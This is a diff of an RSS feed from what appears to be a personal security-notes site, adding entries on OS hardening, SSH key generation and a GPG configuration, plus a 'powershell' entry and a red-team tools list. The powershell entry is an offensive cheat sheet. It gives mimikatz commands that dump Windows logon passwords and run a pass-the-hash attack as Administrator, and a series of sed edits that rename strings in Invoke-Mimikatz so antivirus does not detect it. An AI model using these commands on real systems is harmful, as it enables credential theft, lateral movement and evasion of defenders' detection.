@@ -18,14 +18,35 @@
       <pubDate>Tue, 03 Oct 2017 00:00:00 +0000</pubDate>
       <author>blackvolga@pm.me (GAZ23)</author>
       <guid>https://blackvolga.github.io/intel/101/</guid>
-      <description>Antergos OR TAILS
-Bonus! https://github.com/lfit/ssh-gpg-smartcard-config/blob/master/YubiKey_NEO.rst
-Start with the basics: https://ssd.eff.org/en
-Arch First Steps:
+      <description>#OS Antergos OR TAILS
+Start with the basics: https://ssd.eff.org/en Advanced Mode: https://www.qubes-os.org/
+##Arch First Steps
 https://github.com/Jguer/yay
 https://github.com/sorin-ionescu/prezto
 https://wiki.archlinux.org/index.php/security
-For everything else, see the oracle: wiki.archlinux.org</description>
+For everything else, see the oracle: wiki.archlinux.org
+##SSH
+EdDSA requires OpenSSH 6.5 (ssh -V) or GnuPG 2.1 (gpg –version) so use 4096 bit RSA keys if ED25519 is not available.
+ssh-keygen -t ed25519 -a 100 OR ssh-keygen -t rsa -b 4096 -o -a 100
+Ref: https://stribika.github.io/2015/01/04/secure-secure-shell.html
+##GPG
+~/.gnupg/gpg.conf:
+# Avoid information leaked no-emit-version no-comments export-options export-minimal # Displays the long format of the ID of the keys and their fingerprints keyid-format 0xlong with-fingerprint # Displays the validity of the keys list-options show-uid-validity verify-options show-uid-validity # Limits the algorithms used personal-cipher-preferences AES256 personal-digest-preferences SHA512 default-preference-list SHA512 SHA384 SHA256 RIPEMD160 AES256 TWOFISH BLOWFISH ZLIB BZIP2 ZIP Uncompressed cipher-algo AES256 digest-algo SHA512 cert-digest-algo SHA512 compress-algo ZLIB disable-cipher-algo 3DES weak-digest SHA1 s2k-cipher-algo AES256 s2k-digest-algo SHA512 s2k-mode 3 s2k-count 65011712 ###Create Master Key gpg2 --expert --full-gen-key OPTION 8 &amp;gt; s &amp;gt; e &amp;gt; q 4096 &amp;gt; 1y &amp;gt; y</description>
+    </item>
+    
+    <item>
+      <title>powershell</title>
+      <link>https://blackvolga.github.io/intel/powershell/</link>
+      <pubDate>Tue, 03 Oct 2017 00:00:00 +0000</pubDate>
+      <author>blackvolga@pm.me (GAZ23)</author>
+      <guid>https://blackvolga.github.io/intel/powershell/</guid>
+      <description>https://github.com/gentilkiwi/mimikatz
+https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz
+TLDR: 1.\mimikatz &amp;#34;privilege::debug&amp;#34; &amp;#34;sekurlsa::logonpasswords&amp;#34; exit
+extract passwds
+1mimikatz_command -f sekurlsa::logonPasswords full 2mimikatz_command -f sekurlsa::wdigest pass the hash (on the left hand side)
+1sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe mimidawgz (avoid AV detection)
+1mv Invoke-Mimikatz.ps1 Invoke-MimiDawgz.ps1 2 3sed -i -e &amp;#39;s/Invoke-Mimikatz/Invoke-Mimidawgz/g&amp;#39; Invoke-MimiDawgz.ps1 4sed -i -e &amp;#39;/&amp;lt;#/,/#&amp;gt;/c\\&amp;#39; Invoke-MimiDawgz.ps1 5 6sed -i -e &amp;#39;s/^[[:space:]]*#.*$//g&amp;#39; Invoke-MimiDawgz.ps1 7 8sed -i -e &amp;#39;s/DumpCreds/DumpCred/g&amp;#39; Invoke-MimiDawgz.ps1 9 10sed -i -e &amp;#39;s/ArgumentPtr/NotTodayPal/g&amp;#39; Invoke-MimiDawgz.ps1 11 12sed -i -e &amp;#39;s/CallDllMainSC1/ThisIsNotTheStringYouAreLookingFor/g&amp;#39; 13Invoke-MimiDawgz.</description>
     </item>
     
     <item>
@@ -52,7 +73,10 @@ For everything else, see the oracle: wiki.archlinux.org</description>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <author>blackvolga@pm.me (GAZ23)</author>
       <guid>https://blackvolga.github.io/intel/links/</guid>
-      <description></description>
+      <description>Email https://protonmail.com/
+Chat https://crypto.cat/
+Notepad http://etherpad.org/
+https://github.com/hbin/top-programming-fonts/blob/master/Menlo-Regular.ttf</description>
     </item>
     
     <item>
@@ -81,7 +105,10 @@ Misc 3d scanning - https://github.com/alicevision/meshroom</description>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <author>blackvolga@pm.me (GAZ23)</author>
       <guid>https://blackvolga.github.io/intel/tools/</guid>
-      <description></description>
+      <description>Living Off The Land: https://github.com/LOLBAS-Project/LOLBAS
+Recon https://github.com/jordanpotti/AWSBucketDump https://github.com/laramies/theHarvester https://github.com/thewhiteh4t/pwnedOrNot
+DNS https://github.com/darkoperator/dnsrecon https://github.com/michenriksen/aquatone
+https://github.com/infosecn1nja/Red-Teaming-Toolkit</description>
     </item>
     
   </channel>
